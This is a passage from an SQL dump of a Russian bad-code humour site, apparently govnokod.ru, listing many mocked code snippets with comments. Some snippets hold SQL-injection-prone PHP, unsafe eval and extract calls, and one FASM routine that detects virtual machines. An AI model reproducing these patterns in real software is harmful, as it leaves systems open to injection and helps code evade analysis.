date is not valid, please re-enter.'');\r\nreturn false;\r\n}\r\n\r\nif (new Number(ex_date[0])%4) {\r\nmonth_days[1] = 28;\r\n}\r\nif ((new Number(ex_date[2])>month_days[new Number(ex_date[1])-1]) ) {\r\nalert(''Expiration date is not valid, please re-enter.'');\r\nreturn false;\r\n}','','и такого там много.. еще на PHP скину',12,0,1,0),
  (144,1301,5,1229126694,0,'if isinstance(labels, str):\r\n            try:\r\n                labels = self.vs.get_attribute_values(labels)\r\n            except KeyError:\r\n                labels = [x+1 for x in xrange(self.vcount())]\r\n        elif labels is None:\r\n            labels = [\"\"] * self.vcount()\r\n\r\n        if isinstance(colors, str):\r\n            try:\r\n                colors = self.vs.get_attribute_values(colors)\r\n            except KeyError:\r\n                colors = [\"red\" for x in xrange(self.vcount())]\r\n\r\n        if isinstance(shapes, str):\r\n            try:\r\n                shapes = self.vs.get_attribute_values(shapes)\r\n            except KeyError:\r\n                shapes = [1]*self.vcount()\r\n        if isinstance(edge_colors, str):\r\n            try:\r\n                edge_colors = self.es.get_attribute_values(edge_colors)\r\n            except KeyError:\r\n                edge_colors = [\"black\" for x in xrange(self.ecount())]\r\n\r\n        if not isinstance(font_size, str):\r\n            font_size = \"%spx\" % str(font_size)\r\n        else:\r\n            if \";\" in font_size:\r\n                raise ValueError, \"font size can''t contain a semicolon\"\r\n\r\n        vc = self.vcount()\r\n        while len(labels)<vc: labels.append(len(labels)+1)\r\n        while len(colors)<vc: colors.append(\"red\")\r\n\r\n#.........\r\n\r\n        for eidx, edge in enumerate(self.es):\r\n#.........\r\n                print >>f, \"    <g transform=\\\"translate(%.4f,%.4f)\\\" fill=\\\"%s\\\" stroke=\\\"%s\\\">\" % (x2, y2, edge_colors[eidx], edge_colors[eidx]','','Ребята извращались как могли. \r\n[ol]\r\n[li]Заводят параллельно кучу массивов, чтобы в них хранить в них свойства объектов, чтобы затем при обходе списка объектов обратиться к ним по порядковому номеру в списке. Ну это еще можно понять, это просто не ООП[/li]\r\n[li]Демонстрируют умения в инициализации списка из одинаковых элементов несколькими способами[/li]\r\n[li]Влом было искать - еще ставят точки с запятой в конце строк и убедившись, что объект - строка, преобразуют его в строку.[/li]\r\n[/ol]',15,0,1,9),
  (145,1311,7,1229138929,0,'if( a < 10 ) cout << \"a < 10\";\r\nelse if( a > 10 ) cout << \"a > 10\";\r\nelse if( a == 10 ) cout << \"a == 10\";\r\nelse cout << \"Сегодня совсем плохой день :(\";','','Совсем плохой день :(',15,0,1,8),
  (146,1317,1,1229157737,0,'$temp69 = new dbQuery($sql69, $conn->connId) or die(mysql_error()); \r\n$i=\"\"; while($i<=5) { $res69=$temp69->getArray(); $i++; } \r\n$sql69=\"select * from dj_config\";\r\n$temp69= new dbQuery($sql69, $conn->connId) or die(mysql_error());\r\n$i=\"\";\r\nwhile($i<=5){\r\n\t$res69=$temp69->getArray();\r\n\t$i++;\r\n}','','оригинал: http://blog.sjinks.org.ua/humour/76-programmers-russian-indian-chinese-canadian/',3,0,1,1),
  (147,1323,10,1229170511,0,'procedure date_mask(date_edit:TEdit);\r\nvar s:string;\r\n    i:integer;\r\nbegin\r\n  case length(date_edit.Text) of\r\n  2:begin\r\n      date_edit.Text:=date_edit.Text+''.'';\r\n      date_edit.SelStart:=3;\r\n    end;\r\n  5:begin\r\n      date_edit.Text:=date_edit.Text+''.'';\r\n      date_edit.SelStart:=6;\r\n    end;\r\n  end;\r\n\r\n  if length(date_edit.Text)=10 then\r\n  begin\r\n    for i:=1 to 9 do\r\n    begin\r\n      s:=s+date_edit.Text[i];\r\n    end;\r\n    date_edit.Text:=s;\r\n    date_edit.SelStart:=9;\r\n  end;\r\nend;','','чтобы в компонент edit вводить дату)',10,0,1,0),
  (152,1355,6,1229201129,0,'do {\r\nXLoop: \r\n    XNextEvent(dpy,&event);\r\n    switch(event.type) {\r\n      case ResizeRequest:\r\n        if (event.xresizerequest.window!=win_main)\r\n          goto XLoop;\r\nresize_main:\r\n        xswa.event_mask&= ~ResizeRedirectMask;\r\n        XChangeWindowAttributes(dpy,win_main,CWEventMask, &xswa);\r\n        XSync(dpy,0); /* very important, otherwise we loop endlessly ! */\r\n        XResizeWindow(dpy, win_main,event.xresizerequest.width,event.xresizerequest.height);\r\n        XSync(dpy,0); /* very important, otherwise we loop endlessly ! */\r\n        xswa.event_mask|= ResizeRedirectMask;\r\n        XChangeWindowAttributes(dpy,win_main,CWEventMask, &xswa);\r\n        resize=1;\r\n        XSync(dpy,0); /* another one, just in case... */\r\n        goto redisplay;\r\n\r\n      case Expose:\r\n\tif (event.xexpose.count|moving_button1|vmoving_button)\r\n\t  goto XLoop;\r\n.....// и дальше такой же хрени типа нарисовать и goto XLoop; :)','','Однако под X11 пишут и так:',8,0,1,1),
  (153,1361,9,1229205468,1229319659,'throw new Exception(\"Унылое говно\");','','планируются ли вообще меры по очистке ресурса от унылого говна, дабы поддерживать подборку качественного фекалия? типа, если в минусе более трёх дней, то delete[].',-13,0,0,5),
  (154,1365,1,1229208308,0,'function id($code){\r\n$id=@m_q(\"select id from `id`\")+1;\r\n@lng();\r\nmysql_query(\"UPDATE `id` SET `id` = ''$id'', `odin` = ''1'' WHERE odin = ''1''\");\r\n$id=\"$id\";$r=\"$id\";$r_k=strlen($r);\r\n$m=\"\";\r\n$m_k=strlen($m);$s=$m_k-$r_k;\r\n$t=substr($m,0,$s);$id=\"$t$id\";\r\n$old_id=\"$id\";\r\nif(isset($code)):$id=md5($id);\r\n$id=substr($id,0,18);$id=\"$id\";\r\nendif;return $id;\r\n}','','Такое сложно комментировать.',12,0,1,0),
  (155,1367,1,1229208375,0,'google search site:google.com/search?q=google+search','2, 1','Интересно, а так рекурсия получится?',6,0,1,4),
  (156,1369,1,1229208799,0,'function kogda($date)\r\n{\r\nlist($d,$m,$y)=explode(\".\",$date);\r\n$y=\"$y\";\r\n$d1=array(\"Monday\",\"Tuesday\",\"Wednesday\",\"Thursday\",\"Friday\",\"Saturday\",\"Sunday\");\r\n$d2=array(\"Понедельник\",\"Вторник\",\"Среда\",\"Четверг\",\"Пятница\",\"Суббота\",\"Воскресение\");\r\nfor($i=0;$i<7;$i++){if($d1[$i]==$day){$day=\"$d2[$i]\";}}$day= date(\"l\", mktime(0,0,0,$m,$d,$y));\r\n$d1=array(\"Monday\",\"Tuesday\",\"Wednesday\",\"Thursday\",\"Friday\",\"Saturday\",\"Sunday\");\r\n$d2=array(\"в Понедельник\",\"во Вторник\",\"в Среду\",\"в Четверг\",\"в Пятницу\",\"в Субботу\",\"в Воскресение\");\r\nfor($i=0;$i<7;$i++){if($d1[$i]==$day){$day=\"$d2[$i]\";}}\r\necho\"\";if($m<10){$m=str_replace(\"0\",\"\",$m);}\r\nelse{$m=\"$m\";}\r\n$rl=array (\"\",\"Января\", \"Фераля\", \"Марта\", \"Апреля\", \"Мая\", \"Июня\", \"Июля\", \"Августа\", \"Сентября\", \"Октября\", \"Ноября\", \"Декабря\");\r\nfor($i=1;$i<13;$i++){if($m==$i){$ms=\"$rl[$i]\";}}\r\n$dsw=str_replace(\"0\",\"\",$d);\r\nif($time==\"\"){$time=\"\";}else{$time=\"в $time\";}\r\nprint \"<font face=verdana size=1><i>Новость добавлена: $dsw $ms $y г.  $day  </i></font>\\n\";\r\n}','','Форматирование автора.',12,0,1,0),
  (157,1371,1,1229209082,0,'#Проверяем тест браузер\r\nfunction user_brouser(){\r\nglobal $HTTP_USER_AGENT;\r\n$agent=$HTTP_USER_AGENT;\r\nif(strlen($agent)>2&&!strstr($agent,''MSIE'')){$br=\"Netscape\";}\r\nelse{if($agent!=str_replace(\"Opera\",\"\",$agent)){$br=\"Opera\";}\r\nelse{$br=\"IE\";}}\r\nif($br!=\"IE\"){\r\necho\"Для корректной работы нашего ресурса требуется Internet Explorer версии не ниже 6.0 !\";\r\nexit();\r\n}\r\n}','','Вот так вот жестко.',11,0,1,1),
  (159,1376,1,1229209600,0,'#Проверка подленности числа\r\nfunction test_amount($amount)\r\n{\r\n$amount=str_replace(\" \",\"\",$amount);\r\n$amount=str_replace(\",\",\".\",$amount);\r\nif(is_numeric($amount)!=true){@error_message2(\"Ошибка ввода суммы!\");exit();}\r\nelse{$amount=str_replace(\"-\",\"\",$amount);return $amount;}\r\n}','','Регулярки для лохов.',7,0,1,3),
  (160,1379,1,1229209689,1229385085,'while (true) {\r\n... некий код\r\nif (d === true) {return d;}\r\n... некий код.\r\n}','','Обнаружил в одном исходнике - ',-9,0,0,10),
  (161,1381,1,1229209766,0,'#Определяем Кому/От кого\r\nfunction komu_ot_kogo($from,$type){\r\nglobal $cook_login;\r\nif($cook_login==$from){\r\nif($type==\"exit\"){$komu=\"Куда\";}\r\nelseif($type==\"enter\"){$komu=\"Откуда\";}\r\nelseif($type==\"cart\"){$komu=\"Откуда\";}\r\nelseif($type==\"back\"){$komu=\"От кого\";}\r\nelse{$komu=\"Кому\";}}\r\nelse{$komu=\"От кого\";}\r\nif($type==\"internet\" or $type==\"mobile\"){$komu=\"Куда\";}\r\nreturn $komu;\r\n}','','',12,0,1,0),
  (162,1391,2,1229231871,1229575009,'<html> <head> <style type=\"text/css\"> html, body { background-color:#000; font-family:Segoe UI, Tahoma, Arial, sans-serif; font-size:11px; color:#FFF; margin:0px; padding:0px; width:100%; height:100%; overflow:hidden; } a:link, a:visited, a:active { color:#CCC; text-decoration:underline; } a:hover { color:#F00; text-decoration:none; } #progressbar_block { width:100%; height:100%; padding-left:50%; padding-top:50%; overflow:hidden; } ul.progressbar { width:400px; height:50px; padding:0px; margin:0px; margin-left:-200px; margin-top:-25px; clear:both; list-style-type:none; } ul.progressbar li { padding:0px; margin:0px; float:left; } li.left { background-image:url(img/l_bg_n.png); background-repeat:no-repeat; width:20px; height:50px; } li.middle { background-image:url(img/m_bg_n.png); background-repeat:repeat-x; width:360px; height:50px; } li.right { background-image:url(img/r_bg_n.png); background-repeat:no-repeat; width:20px; height:50px; } </style> <script language=\"javascript\"> function func() { var max = 400 - 16; var pixels = 400 - 16; var step = pixels/max; next(0); } function next(i) { var max = 400 - 16; var pixels = 400 - 16; var step = pixels/max; var lft = document.getElementById(\"left_pb\"); var mid = document.getElementById(\"middle_pb\"); var rht = document.getElementById(\"right_pb\"); if(i < 12) lft.style.width = String(8 + i) + \"px\"; else lft.style.width = String(20) + \"px\"; if(i < pixels - 12 && i > 12) mid.style.width = String(i - 12) + \"px\"; else if(i > 12) mid.style.width = String(360) + \"px\"; else mid.style.width = String(0) + \"px\"; if(i > 372) rht.style.width = String(i - 372) + \"px\"; else if(i < 372) rht.style.width = String(0) + \"px\"; setTimeout(\"next(\" + (i + step < pixels ? i + step : 0) + \")\", 25); } </script> </head> <body onload=\"func();\"> <div id=\"progressbar_block\"> <ul class=\"progressbar\"> <li class=\"left\"><div id=\"left_pb\" style=\"background-image:url(img/l_bg_a.png); width:8px; height:50px; overflow:hidden;\">&nbsp;</div></li> <li class=\"middle\"><div id=\"middle_pb\" style=\"background-image:url(img/m_bg_a.png); width:0px; height:50px; overflow:hidden;\">&nbsp;</div></li> <li class=\"right\"><div id=\"right_pb\" style=\"background-image:url(img/r_bg_a.png); width:0px; height:50px; overflow:hidden;\">&nbsp;</div></li> </ul> </div> </body> </html>','','Вот так мы делаем прогресс-бары',-2,0,0,2),
  (163,1394,2,1229237485,0,'if (''Down'' == ''Down'')\r\n\t{\r\n\t\t//currentSeconds--;\r\n\t\tcurrentSeconds = PromptTimer_StartCounter - correctionTime;\r\n\t\tneedTick = currentSeconds > 0;\r\n\t\tif (!needTick)\r\n\t\t\tcurrentSeconds = 0;\r\n\t}\r\n\telse\r\n\t{\r\n\t\tcurrentSeconds = PromptTimer_StartCounter + correctionTime;\t\r\n\t\t\r\n\t\tif (''True'' == ''False'')\r\n\t\t{\r\n\t\t\tif (GetGMTOffsetInfo()[0] == \"-\")\r\n\t\t\t\tcurrentSeconds += -(GetGMTOffsetInfo()[1] * 3600);\r\n\t\t\telse \r\n\t\t\t\tcurrentSeconds += GetGMTOffsetInfo()[1] * 3600;\r\n\t\t}\r\n\t\t//currentSeconds++; \r\n\t}','','Код таймера на странице задания, проект \"Энкаунтер\" (http://en.cx)\r\n\r\nPosted by zerkms',11,0,1,4),
  (164,1403,1,1229246466,0,'extract($GLOBALS);','','Анекдот в одну строчку',19,0,1,3),
  (165,1406,7,1229248477,0,'void elswap(int ?,int ?, int ?, int ?)  \r\n {\r\n int ?;\r\n ?=?[?][?];\r\n ?[?][?]=?[?][?];\r\n ?[?][?]=?;\r\n }','','обмен значений 2 элементов 2-мерного массива',37,0,1,2),
  (168,1420,1,1229259205,1229500234,'// country\r\nif($user_country) {\r\n\t$where .= ''(tbl_publications.id_country = ''.$user_country;\r\n\t// city\r\n\tif($user_city) {\r\n\t\t$where .= '' OR tbl_publications.id_city = ''.$user_city;\r\n\t}\r\n\t$where .= '')'';\r\n}else{\r\n\t$where .= '' 1=1''; // black magic\r\n}','','черная магия.',-3,0,0,3),
  (169,1427,1,1229268177,1229330760,'echo ''\r\nПутина - в волгу!\r\nЗубкова - на ВАЗ!\r\nТолько потом \r\nПринимайтесь за нас!'';\r\n\r\nprint''<a href=\"http://news.drom.ru/11803.html\">ВВП в ОКУ!</a>'';','','Страна идиотов! Да кому усрался этот отечественный автопром! На нем ездить страшно!',-17,0,0,5),
  (171,1443,7,1229286559,1230369073,'namespace ? = boost::lambda;','','навеяно http://www.govnokod.ru/165',-5,0,0,0),
  (172,1445,1,1229287518,0,'if ($site_is_work)\r\n {\r\n }\r\nelse\r\n {\r\n\texit(''Сайт не работает'');\r\n }','','',3,0,1,8),
  (173,1447,8,1229288213,0,'if (a == null == false) {\r\n}','','когда проверял чужой код пол часа смотрел пока понял что чувак просто не умеет писать if (а != null)',80,0,1,2),
  (175,1459,8,1229318460,0,'bool exitstatus = true;\r\nif (!extremalexit) { exitstatus = true; }','','На всякий случай присвоим еще раз\r\n[Ф]',13,0,1,1),
  (176,1470,1,1229332612,0,'switch (true) {\r\n\t\tcase $formid == ''search_form'' :\r\n\t\tcase $formid == ''search_theme_form'' :\r\n\t\t\t$form[''#action''] = getlangpref() . ltrim($form[''#action''], ''/'');\r\n\t\t\t$form[''#submit''][''gpcustom_customsubmit''] = array();\r\n\t\t\tbreak;\r\n\t\tcase $formid == ''localizernode_translations'' :\r\n\t\t\tforeach ( $form[''languages''] as $key => $value ) {\r\n\t\t\t\tif ( !is_array($value[''#options'']) ) continue;\r\n\t\t\t\tasort($form[''languages''][$key][''#options'']);\r\n\t\t\t}\r\n\t\t\tbreak;\r\n\t\tcase $formid == ''contact_mail_page'' :\r\n\t\t\tif ( $url = variable_get(''gpcustom-contact-form-redirect'', false) ) $form[''#redirect''] = $url;\r\n\t\t\tbreak;\r\n\r\n\t}','','Долго медитировал над этим кодом...\r\nЧую, чувак уже достиг нирваны, в отличае от меня...\r\n(Кусок из Дрюпального модуля)',8,0,1,4),
  (177,1472,1,1229332877,0,'$revutxt = ($result_good[''description'']!='''') ? $result_good[''description''] : '''';','','вот где безопасность! вот где проверка верных значений переменных!)',14,0,1,2),
  (178,1480,8,1229349500,0,'int a=0;\r\nif (a != 0)\r\n{\r\n a=0;\r\n}\r\nelse a=0;','','',7,0,1,1),
  (179,1482,7,1229349672,1229493871,'void\t\treleaseNext(int iID, int iPipeline, bool bForce = false);\r\nbool\t\treleaseForced(int &iID, int &iPipeline);\r\nbool\t\treleaseForced2(int &iID, int &Pipeline);\r\nbool\t\treleaseForced3(int iID, int Pipeline);\r\nbool\t\treleaseFinally(int iID, int iPipe);','','кусок public definitions класса',-5,0,0,0),
  (180,1485,2,1229350026,1230299250,'function check_finished_pending() {\r\n\r\nvar v_wrt_id = document.getElementById(''writer_id'').value;\r\n\r\nif( 6 == 26 )\r\n{\r\nreturn confirm(\"Status ''finished pending'' confirmation:\\nAre you sure you made all needed operations on this order?\");\r\n}\r\nelse\r\n{       //var normal_writer_id = 2520;\r\n\tif (( v_wrt_id != ''2520'' && v_wrt_id != 0))\r\n\t{\r\n\t//alert(v_wrt_id);\r\n\twindow.open(''writer_add_select.php?fid=2020727&writer_id=''+v_wrt_id, ''Assign writer'', ''location,width=650,height=600,top=0'');\r\n\treturn false;\r\n\t}\r\n\telse return confirm(''Save?'');\r\n}','','Правлю функции JS, тут такое чудо с мега условием попалось....',-3,0,0,1),
  (181,1489,12,1229352140,1229515463,'@@r1: \r\n\tdb 0fh, 31h\r\n\tmov edi, edx \r\n\tmov ebx, eax \r\n\tdb 0fh, 31h\r\n\tcmp edi, edx \r\n\tjnz @@r1 \r\n\tsub eax, ebx \r\n\tmov [k], eax\r\n\tmov ecx, 0ah\r\n@@cycle: \r\n\tdb 0fh, 31h\r\n\tmov edi, edx \r\n\tmov ebx, eax \r\n\tdb 0fh, 31h\r\n\tcmp edi, edx \r\n\tjnz @@cycle \r\n\tsub eax, ebx \r\n\tcmp eax, [k]\r\n\tjg @@ext1 \r\n\tmov [k], eax\r\n@@ext1: \r\n\tdec ecx \r\n\tjnz @@cycle \r\n\tmov eax, k\r\n\r\n\tcmp [k],200\r\n\tjg Detected','','ммм.. FASM, детект виртуальной машины с ляпой',-1,0,0,0),
  (182,1491,1,1229353226,1229497460,'<?php\r\n  abstract class registration{\r\n      \r\n      /**\r\n      * @desc тип пользователя (soiskatel, rabotodatel, agent)\r\n      */\r\n      protected $type;\r\n      \r\n      abstract protected function set_BDToValidationUsers($login,$passwd,$lastName,$firstName,$patronymic,$phone,$sex,$year_month_day,$key);\r\n      abstract protected function set_BDFinalRegistration();\r\n      \r\n      /**\r\n      * @desc сохраняет данные в таблице БД валидатор\r\n      */\r\n      static public function pre_registration(){\r\n        #ПРОВЕРКА ПЕРЕДАННЫХ ДАННЫХ#\r\n                #НЕ СДЕЛАНО#\r\n        $array=$_POST;\r\n        $array[''year_month_day'']=$array[''year''].''-''.$array[''month''].''-''.$array[''day''];\r\n#СОХРАНЕНИЕ ДАННЫХ В БАЗЕ#\r\n        if(self::set_BDToValidationUsers($array[''login''],$array[''passwd''],$array[''lastName''],$array[''firstName''],$array[''patronymic''],$array[''phone''],$array[''sex''],$array[''year_month_day''],$array[''key''])){\r\n#ОТПРАВКА СООБЩЕНИЯ НА ПОЧТУ ДЛЯ ПОДТВЕРЖДЕНИЯ# \r\n            if(!self::send_mailRegistration($mail)){\r\n                return array(true);\r\n            }else{ return array(false,''mail'');}\r\n        }else{ return array(false,''dataBase'');}\r\n      }\r\n      \r\n      protected function test_activation_key($key){\r\n        $query=\"SELECT * FROM validation_users WHERE activation_key=''\".$key.\"''\";\r\n        $test=Mysql::prepare($query)->execute()->fetchall_assoc();\r\n        if(count($test)>0) return $test[0];\r\n        else return false;\r\n      } \r\n      \r\n      protected function send_mailRegistration($mail){\r\n        $send=md5($mail.microtime()); \r\n        $subject=''регистрация на сайте'';\r\n        $tetx2mail=''регистрация на сайте my-new-job.wd<br>для подтверждения регистрации перейдите по ссылке <br><a href=\"http://my-new-job.wd/register/''.self::$type.''/mail/?key=''.$send.''&save=y\">подтвердить регистрацию</a><br><a href=\"http://my-new-job.wd/register/''.self::$type.''/mail/?key=''.$send.''&save=n\">отказаться от регистрации</a>'';\r\n        $tetx2mail=iconv(''utf-8'',''windows-1251'',$tetx2mail);\r\n        if(@mail($mail,$subject,$tetx2mail)) return true;\r\n        else return false;     \r\n      }\r\n  }\r\n  \r\n  \r\n  \r\n  \r\nfinal class register_soiskatel extends registration{\r\n  \r\n      protected $type=''soiskatel'';\r\n      \r\n      static function registraion($key){\r\n        #ВАЛИДАЦИЯ ПЕРЕДАННЫХ ДАННЫХ#\r\n                #НЕ СДЕЛАНО#\r\n                \r\n        #СОХРАНЕНИЕ ДАННЫХ В БАЗЕ#\r\n         if($test=self::test_activation_key($key)){\r\n            if(self::set_BDFinalRegistration($test)){\r\n            return array(true);\r\n            }else return array(false,''dataBase'');\r\n         }else return array(false,''actiavation_key'');\r\n                \r\n      }\r\n      \r\n      /**\r\n      * @desc заполняем предварительную таблицу БД для регистрации соискателя\r\n      * @see registration::set_BDToValidationUsers()   \r\n      * @param string логин соискателя\r\n      * @param string пароль соискателя\r\n      * @param string имя соискателя\r\n      * @param string фамилия соискателя\r\n      * @param string отчество соискателя\r\n      * @param string телефон(ы) соискателя\r\n      * @param string пол соискателя\r\n      * @param string дата рождения соискателя\r\n      * @param string ключ активации \r\n      * @return bool занесена новая запись в БД или нет\r\n      */\r\n      protected function set_BDToValidationUsers($login,$passwd,$lastName,$firstName,$patronymic,$phone,$sex,$year_month_day,$key){\r\n        $query=''INSERT INTO validation_users\r\n                        (login,\r\n                        user_type,\r\n                        password,\r\n                        last_name,\r\n                        first_name,\r\n                        patronymic,\r\n                        phones,\r\n                        sex,\r\n                        birthdate,\r\n                        activation_key,\r\n                        puttime) \r\n                VALUES \r\n                        (\"''.$login.''\",\r\n                        \"''.Qualifier::getCompetitorID().''\",\r\n                        \"''.md5($passwd).''\",\r\n                        \"''.$lastName.''\",  \r\n                        \"''.$firstName.''\",\r\n                        \"''.$patronymic.''\",\r\n                        \"''.$phone.''\",','','нет слов...',-4,0,0,2),
  (183,1493,8,1229354323,0,'void delete_ServerClick(object sender, ImageClickEventArgs e)\r\n{\r\n  Parent.FindControl(ID).Visible = false;\r\n}','','автоматически генерируемый контрол, метод находится непосредственно в самом контроле',10,0,1,0),
  (184,1496,9,1229355910,0,'try {\r\n\tallProviders = Stubs.create(IProviderService.class).getAllProviders();\r\n} catch (Exception e) {\r\n} finally {\r\n\tloadData(allProviders);\r\n\tprovidersInitialized = true;\r\n}','','надежно получаем всех поставшиков.',17,0,1,0),
  (185,1499,1,1229356819,0,'Многое из представленного здесь на самом деле является просто непонятным говнобыдлокодерами кода.','','Многое из представленного здесь на самом деле является просто непонятным говнобыдлокодерами кода.\r\n\r\nНужна санитарная служба.',25,0,1,3),
  (186,1501,8,1229356862,1229444707,'public void SetDirty()\r\n{\r\n  ViewState.SetDirty(false);\r\n}','','Отличное название для функции ;-)',-12,0,0,1),
  (187,1504,8,1229357493,1229416401,'if (ValidatorBillablePhase())\r\n{\r\n   // строк 40-50 кода\r\n}\r\n\r\nprivate static bool ValidatorBillablePhase()\r\n{\r\n  return true;\r\n}','','я в шоке от такой валидации ;-)',-17,0,0,2),
  (188,1507,8,1229358382,1229491459,'DateTime startTime = DateTime.Now;\r\nDateTime endTime = DateTime.Now;\r\nforeach (BillablePhas bi in CreateBillablePhaseForFixedPrice.Phases)\r\n{\r\n  if (BillablePhase.Equals(bi))\r\n  {\r\n    errorLbl.Visible = true;\r\n    savedLbl.Visible = false;   \r\n                  \r\n    TimeSpan spread = endTime - startTime; //пик быдлокода\r\n    bi.RatioSpredDateTime = Math.Ceiling(Convert.ToDouble(spread.Days*bi.Ratio/100));\r\n  }\r\n}','','endTime - startTime АААА!!!',-6,0,0,1),
  (189,1517,1,1229390034,0,'function table_exists($table) {\r\n           self :: query(\"show tables from \".DB_NAME);\r\n           for ($i = 0; $i < self :: num(); $i++) {\r\n               $res = mysqli_fetch_array($this -> result);\r\n               if ($res[0] == DB_PREFIX . $table) {\r\n                   return true;\r\n               }\r\n           }\r\n               return false;\r\n       }','','',7,0,1,1),
  (190,1522,8,1229406298,0,'return typeof(Nullable<>).MakeGenericType(new Type[] { valueType }).GetConstructor(new Type[] { valueType }).Invoke(new object[] { value });','','У афтора было желание сэкономить строчки кода\r\n[Ф]',4,0,1,0),
  (191,1524,8,1229406658,1229579505,'if (Program.showLoginDialog &&\r\n     clientVersion != serverVersion &&\r\n          DialogResult.No == MessageBox.Show\r\n              (\r\n                 String.Format\r\n                     (\r\n                          \"The version {0} of the Server does not match the version of the Client {1}. Would you like to proceed?\",\r\n                           serverVersion, clientVersion\r\n                      ),\r\n                  \"Warning\", MessageBoxButtons.YesNo, MessageBoxIcon.Warning\r\n               )\r\n    )','','MessageBox показывается в if\r\n[Ф]',-5,0,0,4),
  (192,1527,8,1229409214,1229521479,'TabToShow currentTabToShowInShortForm = tab;\r\nstring currentTemplateNameToShowInShortForm = templateName;\r\ncurrentShortFormToShow = new ShortForm(currentTabToShowInShortForm, currentTemplateNameToShowInShortForm);','','Чем длиннее названия переменных, тем солиднее выглядит код\r\n[Ф]',-8,0,0,0),
  (193,1531,8,1229414473,1229561664,'volumes = new List<VolumeInformation>(ServerTypedProxy.GetUnfilteredVolumeInformationList())\r\n                .ConvertAll<BindableVolumeInfo>(delegate(VolumeInformation vi) { return new BindableVolumeInfo(vi); });','','Из разряда попробуй отдебажь\r\n[Ф]',-4,0,0,0),
  (194,1533,1,1229418179,1229540049,'<?php\r\nclass Admin_ClientsController extends Page_Controller_Admin\r\n{\r\n    protected $_idMenu = 20;\r\n    \r\n    public function init()\r\n    {\r\n        parent::init();\r\n    }\r\n    \r\n    public function indexAction()\r\n    {\r\n        $this->view->scripts[] = ''jquery'';\r\n        $this->view->scripts[] = ''jquery.center'';\r\n        $tClients = new Db_Table_Clients();\r\n        \r\n        $this->view->clients = $tClients->fetchAll(''confirm = 0'', ''name ASC'');\r\n        $this->view->countConfirmedClients = $tClients->fetchAll(''confirm = 1'')->count();\r\n        $this->renderScript(''body.phtml'');\r\n    }\r\n    \r\n    public function actionAction()\r\n    {\r\n        if ($this->_request->isPost()) {\r\n            $clientId = $this->_request->getPost();\r\n            $action   = $clientId[''action''];\r\n            $tClients = new Db_Table_Clients();\r\n\r\n            unset($clientId[''action'']);\r\n            \r\n            foreach($clientId as $key => $value) {\r\n                echo $value;\r\n                if ($action == ''confirm'') {\r\n                    $tClients->update(array(''confirm'' => 1), ''id = '' . $value);\r\n                    \r\n                    $client = $tClients->fetchRow(''id = '' . $value);\r\n                    \r\n                    $this->view->dealer = new Zend_Mail(''windows-1251'');\r\n                    $mail = new Zend_Mail(''windows-1251'');\r\n                    $mail->addTo($this->view->dealer->email);\r\n                    $mail->setFrom(''tolik@goodsol.ru'', '''');\r\n                    $mail->setSubject(''Регистрация нового дилера на сайте компании Оконные технологии'');\r\n                    $mail->setBodyHtml($this->view->render(''clients/email.phtml''), ''windows-1251'', Zend_Mime::ENCODING_8BIT);\r\n                    \r\n                    //$tr = new Zend_Mail_Transport_Smtp(''mail.hostland.ru'');\r\n                    //Zend_Mail::setDefaultTransport($tr);\r\n                    try {\r\n                        $mail->send();\r\n                    } catch (Exception $e)\r\n                    {\r\n                        \r\n                    }\r\n                    \r\n                } elseif ($action == ''delete'') {\r\n                    $tClients->delete(''id = '' . $value);\r\n                } elseif ($action == ''allow'') {\r\n                    $tClients->update(array(''access'' => 1), ''id = '' . $value);\r\n                } elseif ($action == ''denied'') {\r\n                    $tClients->update(array(''access'' => 0), ''id = '' . $value);\r\n                }\r\n            }\r\n            $this->_redirect($_SERVER[''HTTP_REFERER'']);\r\n        }\r\n        $this->_redirect(''/admin/clients/'');\r\n    }\r\n    \r\n    public function confirmAction()\r\n    {\r\n        if ($this->_request->isPost()) {\r\n            $clientId = $this->_request->getPost();\r\n            var_dump($clientId);\r\n            $tClients = new Db_Table_Clients();\r\n            foreach($tClients as $key => $value) {\r\n                $tClients->update(array(''confirm'' => 1), ''id = '' . $value);\r\n            }\r\n        }\r\n        //$this->_redirect(''/admin/clients/'');\r\n        \r\n    }\r\n    \r\n    public function editAction()\r\n    {\r\n        $id = $this->_request->getParam(''id'');\r\n        if ($id == null) {\r\n            return $this->_redirect(''/admin/clients/'');\r\n        }\r\n        $tClients = new Db_Table_Clients();\r\n        if ($this->_request->isXmlHttpRequest()) {\r\n            $this->view->client = $tClients->fetchRow(''id = '' . $id);\r\n        } elseif ($this->_request->isPost()) {\r\n            $name        = $this->_request->getPost(''name'', '''');\r\n            $login       = $this->_request->getPost(''login'', '''');\r\n            $password    = $this->_request->getPost(''password'', '''');\r\n            $description = $this->_request->getPost(''description'');\r\n            $email       = $this->_request->getPost(''email'');\r\n            $access      = $this->_request->getPost(''access'', 0);\r\n            if ($name == null or $password == null) {\r\n                $messager = new Zend_Session_Namespace(''messager'');\r\n                $messager->error = ''Поле «Имя» и «Пароль» должны быть заполнены'';\r\n            } else {','','',-8,0,0,3),
  (195,1536,1,1229420728,0,'${\"?????\"} = \"Fuck my brain\";\r\nprint ${\"?????\"};','','OMG it works!\r\nДа, PHP поддерживает японский язык.',30,0,1,5),
  (196,1538,2,1229421222,1229691971,'var res = document.getElementById(\"result\");\r\n\t\r\n\tvar data = eval(''('' + result + '')'');\r\n\tvar text = data.status;\r\n\t\r\n\twhile (res.firstChild)\r\n\t\tres.removeChild(res.firstChild);\r\n\t\r\n\tres.appendChild(document.createTextNode(data.status));\r\n\t\r\n\tfor (var i = 0; i < data.result.length; i++)\r\n\t{\r\n\t\tres.appendChild(document.createElement(\"br\"));\r\n\t\tres.appendChild(document.createTextNode(data.result[i]));\r\n\t}','','',-6,0,0,0),
  (197,1541,1,1229425235,0,'$code = ''eval($code);'';\r\neval($code);','','Дзен-PHP',30,0,1,5),
  (198,1548,1,1229430618,1229705897,'$sp_filter = array(0, '''', '''', '''', '''', '''', '''', 1, 1, ''desc'', $id);\r\n\t\r\n\t\t$data = new vtSpotlight_Show($sp_filter); \r\n\r\n\r\n\t\t$table = $data->getTable();\r\n\t\t$fields = $data->getFields();\r\n \r\n(...)\r\n\r\n\t\tif(empty($table[0][''transcriber_concat'']))\r\n\t\t{\r\n\t\t\tunset($table[0][''transcriber_concat'']);\r\n\t\t\tunset($fields[5]); ///  Удаление картикни T, если поле не содержит имени транскрибера\r\n\t\t}\r\n\t\r\n\t\t$spotlight = $table[0];','','паттерн на паттерне одним словом...',-3,0,0,0),
